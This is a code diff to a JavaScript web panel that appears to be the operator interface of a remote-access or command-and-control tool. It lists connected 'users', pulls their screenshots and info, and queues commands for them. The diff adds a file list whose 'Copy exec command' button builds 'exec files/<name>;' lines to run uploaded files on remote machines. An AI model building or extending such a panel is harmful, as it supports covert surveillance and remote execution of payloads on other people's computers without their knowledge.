@@ -1,5 +1,8 @@
 
 var ctrl = 'ctrl.php';
+var dir_screenshots = '../screenshots/';
+var dir_files = '../files/';
+var dir_files_2 = 'files/';
 
 var l_users = [];
 var l_times = [];
@@ -11,6 +14,7 @@ var b_screenshots_shown = false;
 
 var $selected_user = null;
 var $users = null;
+var $files = null;
 var $screenshots = null;
 var $show_screenshots = null;
 var $cmd = null;
@@ -121,6 +125,7 @@ function refresh_users() {
 				.append('<td>' + l_times[i] + '</td>')
 				//.append('<td><button onclick="get_data('+i+')">Show Data</button></td>')
 				//.append('<td><button onclick="view_cmds('+i+')">View Commands</button></td>')
+				.append('<td><button onclick="view_info('+i+')">View Info</button></td>')
 				.append('<td><button onclick="clear_data('+i+')">Clear Data</button></td>')
 				.append('<td><button onclick="clear_cmds('+i+')">Clear Commands</button></td>')
 				.append('<td><button onclick="del_data('+i+')">Delete User</button></td>'));
@@ -175,6 +180,16 @@ function clear_cmds(index) {
 		}
 	});
 }
+function view_info(index) {
+	generic_request(index, 'get_info', function(data) {
+		alert(data);
+	});
+}
+function clear_info(index) {
+	generic_request(index, 'clear_info', function(data) {
+		log('Cleared info for ' + l_users[index]);
+	});
+}
 function del_data(index) {
 	if(!confirm('Are you sure?'))
 		return;
@@ -214,7 +229,7 @@ function list_screenshots() {
 		log('Fetched ' + l_screenshots.length + ' screenshot names.');
 		
 		for (var i = oldnum; i < newnum; i++) {
-			var link = ctrl+'?s='+l_screenshots[i];
+			var link = dir_screenshots+l_screenshots[i];
 			log('Loading new screenshot: ' + l_screenshots[i]);
 			$screenshots.prepend(
 				$('<span class="imgcontainer"></span>').append(
@@ -241,8 +256,48 @@ function del_screenshot(name) {
 	});
 	
 	log('Deleting image: ' + name);
-	$('a[href="'+ctrl+'?s='+l_screenshots[index]+'"]').parent().remove();
+	$('a[href="'+dir_screenshots+l_screenshots[index]+'"]').parent().remove();
 	l_screenshots.splice(index, 1);
+}
+function list_files() {
+	$.ajax({
+		type: 'POST',
+		url: ctrl,
+		cache: false,
+		dataType: 'json',
+		data: {req : 'list_files'}
+	})
+	.done(function(data) {
+		
+		log('Fetched ' + data.length + ' file names.');
+		
+		$files.empty();
+		for (var i = 0; i < data.length; i++) {
+			var link = dir_files+data[i];
+			$files.append($('<tr></tr>').append(
+					$('<td><a href="'+link+'" target="_blank">'+data[i]+'</a></td>'),
+					$('<td><button onclick="choose_file(\''+data[i]+'\')">Copy exec command</button></td>'),
+					$('<td><button onclick="del_file(\''+data[i]+'\')">Delete</button></td>')
+				));
+			
+		}
+	});
+}
+function del_file(name) {
+
+	$.ajax({
+		type: 'POST',
+		url: ctrl,
+		cache: false,
+		dataType: 'text',
+		data: {req : 'del_file', file: name}
+	});
+	
+	log('Deleting file: ' + name);
+	$('a[href="'+dir_files+name+'"]').parent().parent().remove();
+}
+function choose_file(name) {
+	$cmd.val($cmd.val() + 'exec ' + dir_files_2 + name + ';');
 }
 function run_all() {
 	run(-1);
@@ -292,6 +347,7 @@ $(document).ready(function() {
 	$users = $('#users');
 	$screenshots = $('#screenshots');
 	$show_screenshots = $('#show_screenshots');
+	$files = $('#files');
 	$cmd = $('#cmd');
 	$data = $('#data');
 	$cmds = $('#cmds');
@@ -303,6 +359,7 @@ $(document).ready(function() {
 	
 	refresh_users();
 	list_screenshots();
+	list_files();
 	
 	setInterval(function() {
 		if (l_selected >= 0) {
